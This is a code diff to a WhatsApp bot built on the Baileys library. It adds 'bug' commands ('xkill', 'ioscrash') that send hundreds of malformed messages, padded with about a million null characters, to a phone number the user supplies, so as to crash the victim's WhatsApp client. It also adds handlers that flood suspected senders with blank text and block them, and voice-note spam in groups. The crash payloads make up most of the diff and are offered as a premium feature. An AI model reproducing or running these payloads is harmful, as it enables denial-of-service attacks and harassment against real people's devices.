@@ -156,6 +156,21 @@ isForwarded: true,
 }
 
 //bug functions
+const statrp2 = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false, 
+participant: '0@s.whatsapp.net'
+},
+message: {
+listResponseMessage: {
+title: botname
+}
+}
+}
+
+
+
 const xbug2 = {
 key: {
 remoteJid: 'status@broadcast',
@@ -236,6 +251,193 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
 }
 }
 
+
+if (isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "scheduledCallCreationMessage") {
+	newl = "\n".repeat(1000)
+	await XeonBotInc.sendMessage(m.chat, { text: newl });
+	await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+	await XeonBotInc.groupLeave(m.chat)
+        await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `Seems gc ${m.chat} have been bugged,left gc` }, { quoted: statrp2 })
+}
+}
+
+
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "liveLocationMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+	  
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "interactiveMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "interactiveResponseMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "listMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "paymentInviteMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "scheduledCallCreationMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "listResponseMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "documentMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "nativeFlowMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "nativeFlowResponseMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+if (!isGroup && sender !== XeonBotInc.user.id) {
+if (m.mtype === "viewOnceMessage") {
+newl = "\n".repeat(1000)
+await XeonBotInc.sendMessage(sender, { text: newl });
+await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `${sender.split("@")[0]} Seem to have sent bugs,blocked` }, { quoted: statrp2 })
+XeonBotInc.updateBlockStatus(sender, 'block')
+await XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
+}
+}
+
+
+
+var nicetitle = '♱♡ 𓆩Ⱦⱥīɍⱥ Ⱦēȼħ𓆪 ♱♡'
+var nicebody = `XBUG5`
+var niceurl = 'https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r'
+const nicepic = 'https://telegra.ph/file/0691935a017b74bc2e49b.jpg';
+const datas = [
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0204.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0206.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0207.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0208.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0208.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0230.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0231.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0233.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0232.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0235.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0236.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0269.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0270.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0271.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0272.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0273.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0274.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0275.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0276.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0277.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0278.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0279.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0280.mp3?raw=true',
+                   ]
+  if (m.message && m.isGroup) {
+    if (budy.includes('@' + XeonBotInc.decodeJid(XeonBotInc.user.id).split('@')[0])) {
+      let rand = datas[Math.floor(Math.random() * datas.length)];
+      const logoo = await getBuffer(nicepic);
+      let buttonMessage= {
+        'audio': {
+          'url': rand
+        },
+        'mimetype': 'audio/mpeg',
+        'ptt': true,
+        'waveform': [0x63, 0x4b, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x19, 0x32, 0x4b, 0x63, 0x4b, 0x32, 0x19, 0x0],
+        'headerType': 1,
+        'contextInfo': {
+          'forwardingScore': 0x3e7,
+          'isForwarded': false,
+          'externalAdReply': {
+            'title': nicetitle,
+            'body': nicebody,
+            'renderLargerThumbnail': true,
+            'thumbnail': logoo,
+            'mediaUrl': '',
+            'mediaType': 1,
+            'sourceUrl': niceurl,
+            'showAdAttribution': true
+          }
+        }
+      };
+      await XeonBotInc.sendMessage(from, buttonMessage, { quoted: m });
+    }
+  };
+													      }
+	    
         if (!XeonBotInc.public) {
             if (!isCreator && !m.key.fromMe) return
         }
@@ -402,8 +604,175 @@ async function PayMent(jid) {
 		}
 		const VxO = "Xbug5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱" + "\u0000".repeat(50000)
 
-	    
+
+            async function caros(target, Ptcp = true) {
+                        let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+                                viewOnceMessage: {
+                                        message: {
+                                                interactiveMessage: {
+                                                        header: {
+                                                                title: "",
+                                                                locationMessage: {},
+                                                                hasMediaAttachment: true
+                                                        },
+                                                        body: {
+                                                                text: "XBUG5"
+                                                        },
+                                                        nativeFlowMessage: {
+                                                                name: "call_permission_request",
+                                                                messageParamsJson: "XBUG5"
+                                                        },
+                                                        carouselMessage: {}
+                                                }
+                                        }
+                                }
+                        }), {
+                                userJid: X,                                                                                                                                   quoted: Qrad
+                        });
+
+                        await XeonBotInc.relayMessage(target, etc.message, Ptcp ? {
+                                participant: {
+                                        jid: target
+                                }
+                        } : {});
+                };
+
+async function dott(target) {
+                  const dottm = {
+                        key: {
+                                fromMe: false,
+                                participant: '0@s.whatsapp.net',
+                                remoteJid: 'status@broadcast'
+                        },
+                        message: {
+                                orderMessage: {
+                                        orderId: '999999999999',
+                                        thumbnail: null,
+                                        itemCount: 999999999999,
+                                        status: 'INQUIRY',
+                                        surface: 'CATALOG',
+                                        message: 'XBUG5',
+                                        token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
+                                }
+                        },
+                        contextInfo: {
+                                mentionedJid: ['2349072958046@s.whatsapp.net'],
+                                forwardingScore: 999,
+                                isForwarded: true
+                        }
+                }
+     for (let i = 0; i < 5; i ++) {
+			await XeonBotInc.relayMessage(target, {
+
+				'viewOnceMessage': {
+					'message': {
+						'interactiveMessage': {
+							'header': {
+								'title': '',
+								'locationMessage': {},
+								'hasMediaAttachment': true
+							},
+							'body': {
+								'text': 'XBUG5' + '\x00'.repeat(950000)
+							},
+							'nativeFlowMessage': {
+								'messageParamsJson': '\x00'
+							},
+							'carouselMessage': {}
+						}
+					}
+				}
+			}, {
+				participant: {
+					jid: target
+				}
+			});
+       }
+	await XeonBotInc.sendMessage(target, {
+				text: `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱`
+			}, {
+				quoted: dottm
+			}); 
+};
+
+async function galx(target, Ptcp = true) {
+			await XeonBotInc.relayMessage(target, {
+					viewOnceMessage: {
+						message: {
+							interactiveResponseMessage: {
+								body: {
+									text: "XBUG5",
+									format: "EXTENSIONS_1"
+								},
+								nativeFlowResponseMessage: {
+									name: 'galaxy_message',
+									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"XBUG5\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"XBUG5\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"XBUG5${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"...\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+									version: 3
+								}
+							}
+						}
+					}
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+		}; 
+
+
         switch (command) {
+
+case 'xkill': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
+let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+await loading()
+for (let i = 0; i < 50; i++) {
+await PayMent(target)
+await caros(target, Ptcp = true)
+await galx(target, Ptcp = true)
+await dott(target)
+}
+replygcxeon(`Successfully Sent Bug To ${target}`)
+}
+break
+
+case 'ioscrash': {
+if (!isPremium) return replygcxeon(mess.premium)
+if (!args[0]) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
+let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+await loading()
+for (let i = 0; i < 500; i++) {
+ XeonBotInc.relayMessage(target, {
+        "paymentInviteMessage": {
+         "serviceType": "UPI",
+          "expiryTimestamp": Date.now() + 86400000
+         }
+         }, {
+         "participant": {
+           "jid": target
+         }
+        });
+      }
+await replygcxeon("Done Sending Bugs ✅")
+}
+break
+			
+case "getdevice": {
+  if (!isPremium) return
+  const { getDevice } = require("@whiskeysockets/baileys");
+  try {
+    const deviceId = await getDevice(m.quoted ? m.quoted.id : m.key.id);
+    await replygcxeon("Device: " + deviceId);
+  } catch (error) {
+    return replygcxeon("Failed to retrieve device information.");
+  }
+}
+  break
+
+			
             case 'addprem':
                 if (!isCreator) return replygcxeon(mess.owner)
                 if (args.length < 2)
@@ -1979,17 +2348,7 @@ await XeonBotInc.sendMessage(from, { text: '' }, { quoted: xbug2 })
 }
 }
 break
-case 'xkill': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
-await loading()
-let target = text + '@s.whatsapp.net';
-for (let i = 0; i < 50; i++) {
-await PayMent(target)
-}
-replygcxeon(`Successfully Sent Bug To ${target}`)
-}
-break
+
 case 'xkillgc': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Use ${prefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstubwxyz`)
